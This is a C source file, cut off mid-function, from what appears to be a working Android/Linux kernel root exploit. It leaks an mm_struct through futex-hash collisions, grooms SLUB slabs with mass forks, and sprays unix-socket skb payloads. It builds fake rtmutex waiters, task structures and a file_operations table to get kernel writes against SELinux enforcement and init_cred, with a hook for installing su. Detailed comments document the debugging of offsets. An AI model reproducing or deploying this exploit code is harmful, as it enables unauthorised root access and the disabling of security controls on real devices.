#include "common.h"
#include "runtime_offsets.h"
#include "kernelsnitch/kernelsnitch.h"

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
/* ===== gK92 (A54): multi socketpair to break the 251-sendmsg cap =====
 * [A53 finding] payload only occupies the first 4KB of base page (LOCK_OFF
 *   0xE80 + ~0x100 = 0xF80 < 0x1000), and alloc_skb_with_frags falls back
 *   order3 -> order1 -> order0 while frag[0] is still the first page.
 *   So more allocation pressure = higher chance frag[0] is the base page.
 * [A48 cap] sk_sndbuf = min(wmem_max=8MB, val)*2 = 16MB per socket
 *   => single socket tops out at 251 sendmsg. wmem_max is read-only.
 *   Workaround: N independent socketpairs, N*251 sends total.
 * [default 1] identical to old behaviour, revertible.
 */
#define MAX_RECLAIM_SOCKETS 24   /* gK115：8 -> 24，总容量 24*251=6024，主攻可达 4000+ */
static int reclaim_sv[MAX_RECLAIM_SOCKETS][2];
static int reclaim_sock_cnt_inited;
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;
/* ===== gK108 (A150): base page pin / late ctx release =====
 * [根因 A149] base page 在 waitpid(child_leak) 那一刻就 36->35，prior==NULL
 *   ⇒ __slab_free 走 new.frozen=1 ⇒ put_cpu_partial ⇒ 进 c->partial（inuse=35, frozen）。
 *   之后 F1/drain/pre_fork/post_f1 约 2880 次 fork，第一次 c->freelist 耗尽时
 *   ___slab_alloc 的 new_slab 标签就会 `page = c->page = slub_percpu_partial(c)`
 *   把 base 页取走做 active slab 并重新填满 ⇒ close(pre_ctx) 只能 36->28 ⇒ 永不归零
 *   ⇒ 永不 discard ⇒ 永不回 buddy ⇒ payload 落错页 ⇒ HWT（gK104~gK107 四轮皆此）。
 *
 * [A150 修法] 用 /proc/child_leak/mem 钉住 leak 的 mm_count：
 *   proc_mem_open(): mm_access -> mmget(mm_users++) -> mmgrab(mm_count++)
 *                    -> mmput(mm_users--)
 *   mem_release():   mmdrop(mm_count--)
 *   子进程 exit 后 mm_users=0 但 mm_count=1 ⇒ mm_struct 不 free
 *   ⇒ base 页 inuse 恒为 36（full）。
 * [关键] full slab 不在任何 partial 链表，get_partial() 只查 node partial
 *   ⇒ 全部 fork churn 都抢不走 base 页。这是本方案的根据。
 *
 * [时序] fork 全部完成 + warmup 2001 次（base 全程 full）
 *   -> close(leak_memfd)：base 36->35，首次冻结，pobjects=1，成为 c->partial 头
 *   -> close(post/pre/spray)：was_frozen=1 ⇒ 直接 return，不累加不 discard
 *   -> kill 700（纯 free 无 alloc）：每满页首释放 = 一次冻结事件，pobjects += 1
 *      累计 14 次 > cpu_partial=13 ⇒ unfreeze_partials
 *      c->partial 是 LIFO，base 页在尾部最后处理，此时 nr_partial>=min_partial(5)
 *      且 base.inuse==0 ⇒ discard_slab(base) ⇒ 回 buddy HEAD
 *   -> 主攻 M=7 sendmsg：kmalloc-4096 剩 7 对象不 new_slab，frag[0] 直接拿 base 页。
 */
static int gk_ctx_late;
static int leak_memfd = -1;

uintptr_t page_base;
uintptr_t last_mm_struct;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
char ashmem_path[256] = "/dev/ashmem";

/* 2-write support */
int pselect_custom_write;
int mcast_slide_mode;
uintptr_t mcast_slide_value;
uintptr_t mcast_slide_target;
uintptr_t pselect_custom_target;
uintptr_t pselect_custom_value;
int pselect_child_node;  /* 1=write page+0x100 (preserves initialized), 0=write zero */

void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode) {
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_write = mode;
}

void clear_pselect_write(void) {
  pselect_custom_write = 0;
  pselect_custom_target = 0;
  pselect_custom_value = 0;
}

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, env_flag("KS_VERBOSE", 0), 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}
/* ===== gK51/gK58：--bfself 单进程自证 bruteforce 逻辑 =====
 * 目的：排除跨进程（子进程 find_collisions / 父进程 bruteforce）差异。
 * 判据：命中 ⇒ 逻辑正确；不命中且 pass1>0 ⇒ 扫描几何正确但真 mm 不在范围。
 */
int run_bfself(void) {
  select_offsets();
  log_startup_context();
  ckpt_open();
  pr_info("==== BFSELF start ====%s", "\n");
  size_t mm_sz = (size_t)env_ulong("MM_SZ", MM_STRUCT_SZ);
  if (mm_sz < 0x100 || mm_sz > 0x2000) mm_sz = MM_STRUCT_SZ;
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(mm_sz, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
                          env_flag("KS_VERBOSE", 1), 0);
  pr_info("BFSELF: mm_sz=%#zx collisions=%d threads=%d%s", mm_sz, KSNITCH_COLLISIONS, cpu_count, "\n");
  kernelsnitch_find_collisions(ks);
  ckpt_val("bs_collisions_ok", kernelsnitch_found_collisions(ks) ? 1 : 0);
  ckpt_val("bs_state_after_col", (long)ks->state);
  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("BFSELF: collisions failed%s", "\n");
    ckpt_end("BFSELF");
    ckpt_close();
    return 1;
  }
  kernelsnitch_bruteforce(ks);
  ckpt_val("bs_found", (long)ks->found);
  ckpt_val("bs_mm_struct", (long)ks->mm_struct);
  ckpt_val("bs_mm_is_minus1", ks->mm_struct == (size_t)-1 ? 1 : 0);
  pr_info("BFSELF: found=%zu mm_struct=%#zx%s", (size_t)ks->found, (size_t)ks->mm_struct, "\n");
  kernelsnitch_cleanup(ks);
  ks = NULL;
  ckpt_end("BFSELF");
  ckpt_close();
  return 0;
}


uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

__attribute__((weak))
int install_embedded_wallpaper(void) {
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void log_slide_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
             "egid=%u attr=%s enforce=%s\n",
             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 3;    /* SCHED_BATCH — nice change triggers PI walk (pi=true) */
  attr.sched_nice = nice_value;
  errno = 0;
  long ret = syscall(274, tid, &attr, 0);
  if (ret != 0) {
    pr_error("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
  }
  return ret;
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

int has_zero_byte(uintptr_t value) {
  for (int i = 0; i < 8; i++) {
    if (((value >> (i * 8)) & 0xff) == 0) {
      return 1;
    }
  }
  return 0;
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t data_addr(uintptr_t image_addr) {
  return p0_data_alias(image_addr);
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

static void fill_init_cred_copy(unsigned char *p, size_t off) {
  unsigned char *c = p + off;
  memset(c, 0, 136);
  put32(c, 0, 1);
  put64(c, 48, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 56, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 64, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 72, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 80, 0xFFFFFFFFFFFFFFFFULL);
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    /* ===== V3 关键修改（2026-10-23）：bruteforce 必须在子进程里跑 =====
     * [根因 A16/A17]
     *   futex_hash 的碰撞信号由【当前进程 mm】决定：__do_increase 用
     *   FUTEX_WAIT_PRIVATE 锁 ks->inc_futex[id]，桶归属取 current->mm。
     *   旧代码：find_collisions 在子进程跑、bruteforce 在主进程跑 ⇒
     *     子进程测出的碰撞集，却拿主进程的 mm 去比对 ⇒ 唯一能通过的候选
     *     必然是【主进程自己的 mm_struct】⇒ leaked = 主进程 mm ⇒
     *     base 页上有主进程 mm 这个【永不释放】的对象 ⇒ 该页 inuse 永远>=1
     *     ⇒ 永不 discard_slab ⇒ alloc_pages(order=3) 永远拿不到 base 页。
     * [修法] 把 bruteforce 也搬到同一个子进程里。这样碰撞测量与比对
     *   使用同一个 mm（子进程自己的），leaked 就是【子进程的 mm_struct】。
     *   子进程随后 exit(0)，mm_users 归零 ⇒ __mmput ⇒ mmdrop ⇒ __mmdrop
     *   ⇒ free_mm ⇒ kmem_cache_free ⇒ base 页 inuse 可归零 ⇒ 可 discard。
     * [前提已验证] ks 是 mmap(MAP_ANON|MAP_SHARED)，子进程写 ks->mm_struct
     *   主进程可见；find_collisions 结束时 state=COLLISIONS_FOUND，
     *   bruteforce 的 ASSERT 正好要求该状态，可直接接着调用。
     */
    kernelsnitch_find_collisions(ks);
    if (kernelsnitch_found_collisions(ks)) {
      kernelsnitch_bruteforce(ks);
    }
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  /* gK92: BSS zero-init would close fd 0. Set all entries to -1 once first. */
  if (!reclaim_sock_cnt_inited) {
    for (int i = 0; i < MAX_RECLAIM_SOCKETS; i++) {
      reclaim_sv[i][0] = -1;
      reclaim_sv[i][1] = -1;
    }
    reclaim_sock_cnt_inited = 1;
  }
  for (int i = 0; i < MAX_RECLAIM_SOCKETS; i++) {
    for (int j = 0; j < 2; j++) {
      if (reclaim_sv[i][j] >= 0) {
        close(reclaim_sv[i][j]);
        reclaim_sv[i][j] = -1;
      }
    }
  }
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  /* gK108 (A150)：重试路径必须释放 leak 钉住 fd，否则 fd 泄漏且 base 页永不释放 */
  if (leak_memfd > 0) {
    close(leak_memfd);
    leak_memfd = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  /* ===== gK88（F2）：PREPARE_SLABS 默认 32 → 48 =====
   * [Q7] SLUB discard_slab 需要 node nr_partial >= min_partial。
   *   mm_cachep: min_partial = clamp(ilog2(896)/2, 5, 10) = 5
   *   ⇒ 同一 node 的 mm_cachep partial 链表至少要有 5 个 slab 才会 discard 空 slab。
   *   5 个 slab = 5 * 32KB = 160KB = 180 个 mm_struct。
   *   旧默认 32 slabs = 1152 个 mm，数量上够，但这些 slab 释放后
   *   未必都进 node partial（受 frozen 影响，见 F1）。
   *   提到 48 = 1728 个 mm = 48 slabs，留足余量跨过 5 的门槛。
   *   可用 PREPARE_SLABS 环境变量覆盖。
   */
  int prepare_slabs = env_int_range("PREPARE_SLABS", 48, 4, 96);
  prepare_ctx.mm_cnt = prepare_slabs * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

/* ===== gK110（2026-10-27）坐标系自检实现（声明在 common.h）=====
 * 判据：SKB_DELTA + ptr_bias == 0 时，写入侧与指针侧落在同一 frag 页偏移。 */
void gk110_report_coords(void) {
  int64_t skb_delta = (int64_t)env_ulong("SKB_DELTA", (unsigned long)(uint64_t)SKB_DATA_DELTA);
  int64_t ptr_bias = (int64_t)env_ulong("SKB_BIAS_PTR", 0UL);
  uintptr_t write_skbbuf_idx = (uintptr_t)SKB_FRAG_BIAS + (uintptr_t)LOCK_OFF;
  uintptr_t write_frag_off = (uintptr_t)LOCK_OFF;
  long long ptr_frag_off = (long long)skb_delta + (long long)ptr_bias + (long long)LOCK_OFF;
  printf("--- gK110 coordinate check ---\n");
  printf("SKB_FRAG_BIAS          = %#lx  (skb_buf index offset)\n", (unsigned long)SKB_FRAG_BIAS);
  printf("SKB_DATA_DELTA         = %lld\n", (long long)SKB_DATA_DELTA);
  printf("ptr_bias (SKB_BIAS_PTR)= %lld (%#llx)\n", (long long)ptr_bias,
         (unsigned long long)ptr_bias);
  printf("write side: skb_buf[%#lx] -> frag_off %#lx\n",
         (unsigned long)write_skbbuf_idx, (unsigned long)write_frag_off);
  printf("ptr   side: base + %lld -> frag_off %#llx\n", (long long)(skb_delta + ptr_bias),
         (unsigned long long)ptr_frag_off);
  if (ptr_frag_off == (long long)write_frag_off) {
    printf("coordinate check       = MATCH (fake_lock points at payload)\n");
  } else {
    printf("coordinate check       = MISMATCH delta=%lld  <-- payload/fake_lock detached\n",
           (long long)(ptr_frag_off - (long long)write_frag_off));
  }
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  /* ===== 重建137（gK36）：payload_base 支持运行时偏移覆盖 =====
   * 原式 payload_base = base + SKB_DATA_DELTA，而 SKB_DATA_DELTA = -0xe80 无推导（D级）。
   * 由于 LOCK_OFF 恰好 = 0xE80，二者精确抵消：
   *   fake_lock = base + SKB_DATA_DELTA + LOCK_OFF = base + 0
   * 实测 r123/gK35：base = 0xffffff80df6f8000（phys 3.49GiB，8页对齐，合法），
   * 但 trylock 读 base+0 仍崩 -> 说明「skb 数据区起点」不是 base，偏移假设错了。
   * 用 SKB_DELTA 环境变量（有符号，可传 0 / 0xfffffffffffff000 之类）直接二分。 */
  int64_t skb_delta = (int64_t)env_ulong("SKB_DELTA", (unsigned long)(uint64_t)SKB_DATA_DELTA);
  /* =====★★★ gK105（A133）根因修复：指针侧必须与写入侧同基准 =====
   * [★ 定案] payload 写入侧（util.c:698）用的是：
   *     unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;   // 0xEC0
   *     put32(p, LOCK_OFF + 0x00, 0);
   *   ⇒ LOCK 字段实际写在 skb_buf 的 0xEC0 + 0xE80 = 0x1D40。
   *
   * [A 级映射] sendmsg(iov_len=65536) 的实际布局（common.h:101-135 反汇编已证）：
   *   size = 36544, data_len = 32768
   *   ① order-0 skb head 装 skb_buf[0 .. 0xEC0)
   *   ② order-3 frag 页 装 skb_buf[0xEC0 .. 0x8EC0)
   *   ⇒ 内核 base 页（= frag 页）offset X  ↔  skb_buf[0xEC0 + X]
   *
   * [旧 bug] 指针侧此前是 payload_base = base + skb_delta（不含 BIAS）：
   *     fake_lock = base + 0xE80            ← 指向 frag 页 offset 0xE80
   *   而 payload 的 LOCK 落在 frag 页 offset 0x1D40。
   *   ⇒ 差 0xEC0。fake_lock->wait_lock 读到的是 payload 之外的其他字节（非 0）
   *   ⇒ arch_spin_trylock 失败（要求 owner==next）
   *   ⇒ rtmutex.c [5] `goto retry` 跳回 retry 而非 again，跳过 ++depth
   *   ⇒ **真·无限自旋**，不崩溃、不看门狗，直到硬件看门狗复位
   *   ⇒ 这就是 gK101~gK104 全部 HWT 的唯一根因。
   *
   * [历史漏洞点] 2026-10-22 把 SKB_FRAG_BIAS 从 0 改成 0xEC0 时，
   *   只验证了「写入侧各偏移都回到同一 frag 页」（结论正确），
   *   **漏了同步修正指针侧基准**。写入侧加了 BIAS，指针侧没加。
   *
   * [修法] 指针侧补上 SKB_FRAG_BIAS。fake_lock/fake_w0/fake_task/fake_fops/
   *   binwrite_target/fake_left/w1 全部由 payload_base 派生（util.c:588-591/610/621/625/626/732），
   *   故一处修正即全部生效。
   *
   * [越界校验] 加 BIAS 后最大偏移 W1_OFF+0x48 = 0x2C08，FAKE_TASK+0xa18 = 0x2B58，
   *   FOPS_OFF+0x700 = 0x2540，全部 < 0x8000（frag 页容量）✓
   *   注意 frag 页实际可用 data_len = 32768，写入 skb_buf 长度 0x8EC0，
   *   frag 页内只用到 [0, 0x8000)，payload 最大 0x2C08 远在范围内。
   *
   * [可用 SKB_BIAS_PTR=0 回退做对照实验]
   */
   /* =====★★★ gK110（2026-10-27）根因修复：指针侧 BIAS 必须为 0 ★★★=====
    * [A级坐标系推导，此前一直搞错]
    *   frag 页偏移 X  ⟷  skb_buf[0xEC0 + X]
    *   推导：unix_stream_sendmsg 反汇编
    *     +0x12c mov w10,#0x8ec0      ⇒ SKB_MAX_HEAD(0)+UNIX_SKB_FRAGS_SZ = 36544
    *     +0x138 sub w9,w28,#0xec0    ⇒ SKB_MAX_HEAD(0) = 3776
    *     +0x144 and w9,w9,#0xfffff000⇒ PAGE_ALIGN ⇒ data_len = 32768
    *     +0x158 mov w5,#0x3          ⇒ max_page_order = 3
    *   写路径 net/core/datagram.c skb_copy_datagram_from_iter:
    *     start = skb_headlen(skb) = 3776
    *     copy_page_from_iter(frag_page, frag->page_offset + offset - start, ...)
    *     ⇒ 第一个 frag 字节 = skb_buf[3776]，frag 页内 page_offset = 0
    *
    * [写入侧] util.c:772  p = skb_buf + 0xEC0;  put32(p, LOCK_OFF)
    *     ⇒ 写 skb_buf[0xEC0+0xE80] ⇒ **frag 页内偏移 0xE80**
    * [旧指针侧 gK105~gK109] payload_base = base + 0xEC0
    *     ⇒ fake_lock = base + 0x1D40  ⇒ **偏了整整 0xEC0**
    *     ⇒ trylock 读到的是 frag 页 0x1D40 = W1_OFF(0x1D00)+0x40
    *       = w1->prio = 0x7fffffff ⇒ eor 高低半字不等 ⇒ trylock 必失败
    *       ⇒ rtmutex retry 自旋 ⇒ HWT / 崩
    * [A-实测] ckpt 铁证：
    *     gK103/gK104: fake_lock-base = 0x0e80（无 BIAS，正确）
    *     gK105/gK108: gk105_frag_off_lock = 0x1d40（gK105 引入错误）
    *
    * [修复] 指针侧 BIAS 取 0。写入侧保持不变（它本来就对）。
    *   两者从此同基准：fake_lock = base + 0xE80 = payload 实际落点 ✓
    * [兼容] SKB_BIAS_PTR 环境变量仍可覆盖（传 0xEC0 即回到旧行为做对照）。 */
   int64_t ptr_bias = (int64_t)env_ulong("SKB_BIAS_PTR", 0UL);
  uintptr_t payload_base = (uintptr_t)((int64_t)base + skb_delta + ptr_bias);
  pr_info("GK36: base=%016zx skb_delta=%ld ptr_bias=%#lx payload_base=%016zx fake_lock=%016zx\n",
          (size_t)base, (long)skb_delta, (unsigned long)ptr_bias, (size_t)payload_base,
          (size_t)(payload_base + LOCK_OFF));
  ckpt_val("gk105_ptr_bias", (long)ptr_bias);
  ckpt_val("gk105_payload_base", (long)payload_base);
  ckpt_val("gk105_frag_off_lock", (long)((payload_base + LOCK_OFF) - base));

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    if (pselect_custom_write) {
      if (pselect_child_node) {
        if (pselect_custom_write == 2) {
          /* Write 2 (cred): child = REAL init_cred (P0 address).
           * child->__rb_parent_color corrupts init_cred.usage (bytes 0-7)
           * but that's just a ref count — large value = won't be freed.
           * uid/caps/security/user_ns all stay intact at offsets 8+. */
          fake_right = data_addr(INIT_CRED);
        } else {
          /* Write 1 (selinux): child = base+0x100 → byte0=0, byte1=1 */
          fake_right = base + 0x100;
        }
      } else {
        fake_right = 0;  /* leaf: write 0 */
      }
      fake_left = 0;
      if (pselect_custom_write == 2) {
        fake_fops = payload_base + CRED_COPY_OFF;
      }
      fake_parent = pselect_custom_target - 8;
      if (!pselect_custom_value) {
        pselect_custom_value = fake_fops;
      }
    } else {
      fake_parent = fake_fops;
      fake_right = data_addr(ASHMEM_MISC_FOPS);
